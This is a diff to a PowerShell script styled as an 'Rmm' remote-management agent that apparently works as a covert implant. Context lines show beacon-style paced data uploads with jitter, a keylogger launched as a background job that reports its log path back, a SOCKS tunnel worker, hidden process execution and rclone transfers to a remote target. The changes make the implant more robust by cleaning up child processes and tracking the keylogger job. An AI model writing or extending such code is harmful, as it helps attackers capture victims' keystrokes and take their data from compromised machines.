@@ -1247,6 +1247,21 @@ function Get-RmmPathByteSize {
     return $total
 }
 
+function Stop-RmmChildProcess {
+    param($Process)
+    if ($null -eq $Process) { return }
+    try {
+        if (-not $Process.HasExited) {
+            $Process.Kill()
+            [void]$Process.WaitForExit(5000)
+        }
+    } catch {
+        # The child may already have exited or failed before process creation.
+    } finally {
+        try { $Process.Dispose() } catch {}
+    }
+}
+
 function Invoke-RmmRcloneTransferWithProgress {
     param(
         [Parameter(Mandatory = $true)][string]$RclonePath,
@@ -1260,6 +1275,7 @@ function Invoke-RmmRcloneTransferWithProgress {
     $lastSentPct = -1.0
     $lastSentAt = [DateTime]::MinValue
     $readOffset = 0
+    $proc = $null
     try {
         $argList = @(
             $Mode, $LocalPath, $RemoteTarget,
@@ -1295,7 +1311,7 @@ function Invoke-RmmRcloneTransferWithProgress {
         }
         Read-RmmRcloneJsonLogProgress -LogPath $logFile -ReadOffset ([ref]$readOffset) -Context $Context `
             -Headers $Headers -LastSentPct ([ref]$lastSentPct) -LastSentAt ([ref]$lastSentAt)
-        $proc.WaitForExit()
+        while (-not $proc.WaitForExit(200)) { Start-Sleep -Milliseconds 1 }
         $proc.Refresh()
         $exitCode = $proc.ExitCode
         $logDetail = Get-RmmRcloneLogErrorSummary -LogPath $logFile
@@ -1318,6 +1334,7 @@ function Invoke-RmmRcloneTransferWithProgress {
             } -Headers $Headers
         }
     } finally {
+        Stop-RmmChildProcess -Process $proc
         Remove-Item -LiteralPath $logFile -Force -ErrorAction SilentlyContinue
     }
 }
@@ -1662,14 +1679,18 @@ function Invoke-RmmHiddenProcessWait {
     $psi.RedirectStandardError = $true
     $proc = New-Object System.Diagnostics.Process
     $proc.StartInfo = $psi
-    [void]$proc.Start()
-    $stdoutTask = $proc.StandardOutput.ReadToEndAsync()
-    $stderrTask = $proc.StandardError.ReadToEndAsync()
-    $proc.WaitForExit()
-    return [pscustomobject]@{
-        ExitCode = $proc.ExitCode
-        StdOut   = $stdoutTask.GetAwaiter().GetResult()
-        StdErr   = $stderrTask.GetAwaiter().GetResult()
+    try {
+        [void]$proc.Start()
+        $stdoutTask = $proc.StandardOutput.ReadToEndAsync()
+        $stderrTask = $proc.StandardError.ReadToEndAsync()
+        while (-not $proc.WaitForExit(200)) { Start-Sleep -Milliseconds 1 }
+        return [pscustomobject]@{
+            ExitCode = $proc.ExitCode
+            StdOut   = $stdoutTask.GetAwaiter().GetResult()
+            StdErr   = $stderrTask.GetAwaiter().GetResult()
+        }
+    } finally {
+        Stop-RmmChildProcess -Process $proc
     }
 }
 
@@ -1933,6 +1954,7 @@ if ($script:DownloadBurst) {
     Write-Host "[*] Download: paced like beacon (sleep+jitter between chunk POSTs; set `$downloadBurst = `$true for burst)" -ForegroundColor DarkGray
 }
 
+try {
 while (-not $registered) {
     $registerAttempt++
     try {
@@ -2147,7 +2169,7 @@ while ($true) {
                             }
                         }
                     }
-                    Start-Job -ScriptBlock $scriptBlock -Name $klJobName -ArgumentList $keylogPath, $baseSleepSeconds, $jitterPercent | Out-Null
+                    $script:RmmKeyloggerJob = Start-Job -ScriptBlock $scriptBlock -Name $klJobName -ArgumentList $keylogPath, $baseSleepSeconds, $jitterPercent
                     $script:rmmKeylogPath = $keylogPath
                     $result = "Keylogger started; log file: $keylogPath"
                     Send-RmmTextResult -CommandLine $command -Text $result -Headers $headers
@@ -2273,4 +2295,12 @@ while ($true) {
             $currentRetry = 0
         }
     }
-} 
+}
+} finally {
+    try { Stop-RmmSocksChannelWorker } catch {}
+    if ($null -ne $script:RmmKeyloggerJob) {
+        try { $script:RmmKeyloggerJob | Stop-Job -ErrorAction SilentlyContinue } catch {}
+        try { $script:RmmKeyloggerJob | Remove-Job -Force -ErrorAction SilentlyContinue } catch {}
+        $script:RmmKeyloggerJob = $null
+    }
+}
